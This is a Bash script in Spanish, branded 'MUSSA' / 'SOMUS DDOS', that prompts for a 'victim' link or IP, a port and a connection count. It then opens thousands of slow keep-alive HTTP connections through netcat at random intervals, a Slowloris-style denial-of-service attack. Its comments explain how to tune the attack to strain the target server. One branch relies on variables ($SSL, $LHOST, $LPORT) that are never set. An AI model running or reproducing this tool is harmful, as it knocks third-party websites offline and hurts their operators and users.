#!/bin/bash





echo -e "\033[1;32m	███╗   ███╗██╗   ██╗███████╗███████╗ █████╗ \033[0m"
echo -e "\033[1;32m	████╗ ████║██║   ██║██╔════╝██╔════╝██╔══██╗\033[0m"
echo -e "\033[1;32m	██╔████╔██║██║   ██║███████╗███████╗███████║\033[0m"
echo -e "\033[1;32m	██║╚██╔╝██║██║   ██║╚════██║╚════██║██╔══██║\033[0m"
echo -e "\033[1;32m	██║ ╚═╝ ██║╚██████╔╝███████║███████║██║  ██║\033[0m"
echo -e "\033[1;32m	╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝\033[0m"
echo -e "\033[1;33m     ____________________SOMUS___________________\033[0m"       
echo -e "\033[1;33m     _________________By_Arekkusu________________"
echo -e "\033[1;33m     _____https://www.facebook.com/somushack/____"

#Gracias por descargarme :D Te lo agradece SOMUS uwu
#Facebook de SOMUS por si quieres contactar "https://www.facebook.com/somushack/"
{ echo "Iniciando MUSSA...." && sleep 1
echo "Link de la victima:"
#Aqui va un link o ip de la victima 
	read -i $TARGET -e TARGET
echo "Tu objetivo es $TARGET"
#Nesecitas un puerto para atacar
echo "Ingresa el puerto (Normal 80):"
	read -i $PORT -e PORT
	: ${PORT:=80}
#Verificacion de un puerto valido
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Puerto invalido, poniendo el puerto 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "No valido el numero del puerto! poniendo puerto 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Puerto elejido no es valido! poniendo el puerto 80"
	else echo "Puerto usado $PORT"
	fi
#Cuantos ataques deveria hacer? NO HAY LIMITE pero predeterminadamente es 5000
echo "Pon el numero de conexiones (Normal 5000):"
		read CONNS
	: ${CONNS:=5000}
#Se puede ingresar un numero entero valido
	if ! [[ "$CONNS" =~ ^[0-9]+$ ]]; then
CONNS=5000 && echo "Numero invalido!  Usando 5000 conexiones"
	fi
#ENVIO DE CONEXIONES
#Demasiado largo y la conexion se cerrara
#Demasiado corto y no tendra casi ningun efecto en el servidor
#Tanto como corto o largo, es malo, lo mejor es poner uno entre 5 y 15 
echo "Escoge un intervalo para enviar los datos."
echo "DEFAULT es entre 5 y 15, o pone uno tu mismo:"
	read INTERVAL
	: ${INTERVAL:=r}
	if [[ "$INTERVAL" = "r" ]]
then
#Si ponemos default se pondra un numero aleatorio entre 5 y 15
INTERVAL=$((RANDOM % 11 + 5))
#COMPROBACION QUE ES UN NUMERO VALIDO
	elif ! [[ "$INTERVAL" =~ ^[0-9]+$ ]] && ! [[ "$INTERVAL" = "r" ]]
then
INTERVAL=$((RANDOM % 11 + 5)) && echo "Invalido!  Usando un valor random de 5 a 15 segundos"
	fi

if [[ "$SSL" = "y" ]]
then
echo "Iniciando MUSSA....Usa 'Ctrl+c' Para salir prematuramente" && sleep 1
	i=1
	while [ "$i" -le "$CONNS" ]; do
echo "SOMUS DDOS esta preparando el ataque, esta es la conexion $i, El intervalo es $INTERVAL segundos"; echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n$RANDOM: $RANDOM\r\n"|nc -i $INTERVAL -w 30000 $LHOST $LPORT  1>/dev/null 1>/dev/null & i=$((i + 1)); done
echo "Cargadas $CONNS conexiones....saliendo"
else

echo "Iniciando MUSSA ....Usa 'Ctrl+c' Para salir prematuramente" && sleep 1
	i=1
	while [ "$i" -le "$CONNS" ]; do
echo "MUSSA esta preparando el ataque, esta es la conexion $i, El intervalo es $INTERVAL segundos"; echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n$RANDOM: $RANDOM\r\n"|nc -i $INTERVAL -w 30000 $TARGET $PORT  2>/dev/null 1>/dev/null & i=$((i + 1)); done
#Saliendo apenas se terminen las conexiones o los recursos
echo "Cargadas $CONNS conexiones....saliendo"
fi
}
